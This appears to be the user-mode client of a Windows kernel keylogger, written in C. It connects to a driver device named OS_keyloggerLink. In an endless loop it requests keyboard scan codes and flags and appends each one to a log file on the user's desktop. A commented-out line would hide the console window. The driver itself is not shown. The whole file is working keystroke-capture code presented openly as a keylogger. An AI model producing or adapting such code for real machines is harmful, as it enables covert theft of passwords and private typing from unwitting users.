#include <windows.h>
#include <stdio.h>

#include "../Shared.h"

#define IOCTL_WAIT_FOR_KEY  CTL_CODE(FILE_DEVICE_KEYBOARD, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main() {
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	HANDLE hDevice;
	DWORD bytesReturned;
	KEY_EVENT_DATA buffer;

	hDevice = CreateFile(L"\\\\.\\OS_keyloggerLink", GENERIC_READ , FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		printf("could not connect to the driver\nerror = %lu\n", error);
		getchar();
		return 1;
	}

	BOOL status;
	while (1) {
		printf("request sent\n");
		status = DeviceIoControl(hDevice, IOCTL_WAIT_FOR_KEY, NULL, 0, &buffer, sizeof(KEY_EVENT_DATA), &bytesReturned, NULL);
		
		if (status) {
			printf("key recieved\n");
			FILE* file = fopen("C:\\Users\\WDKRemoteUser\\Desktop\\OS_keylogger.txt", "a");

			if (file) {
				fprintf(file, "0x%hx 0x%hx\n", buffer.MakeCode, buffer.Flags);
				fclose(file);
				printf("saved key\n");
			}
			else
			{
				DWORD error = GetLastError();
				printf("Could not open a file\n error: %lu\n", error);
			}
		}
		else {
			DWORD error = GetLastError();
			printf("DeviceIoControl failed\n error: %lu\n", error);
			Sleep(1000);
		}
	}

	CloseHandle(hDevice);

	return 0;
}